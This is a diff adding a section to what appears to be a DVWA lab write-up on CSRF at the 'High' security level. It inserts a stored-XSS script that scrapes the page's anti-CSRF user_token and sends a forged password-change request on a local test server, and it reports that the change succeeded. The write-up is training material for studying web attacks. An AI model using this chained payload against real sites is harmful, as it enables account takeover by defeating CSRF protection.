@@ -124,6 +124,18 @@ Explanation of why it worked: The security check is broken, the developer isn't 
 ### Security Level: High
 
 Payload Used: Chained attack, uses inbuilt XSS Stored module to bypass CSRF protection
+```html
+  <script>
+  var req = new XMLHttpRequest();
+  req.onload = function() {
+      var token = this.responseText.match(/user_token\' value=\'(.*?)\'/)[1];
+      var attack = new XMLHttpRequest();
+      attack.open("GET", "[http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=](http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token=)" + token, true);
+      attack.send();
+  };
+  req.open("GET", "[http://127.0.0.1:8080/vulnerabilities/csrf/](http://127.0.0.1:8080/vulnerabilities/csrf/)", false);
+  req.send();
+  </script>
 
 Result: Password for the website was changed successfully.
 
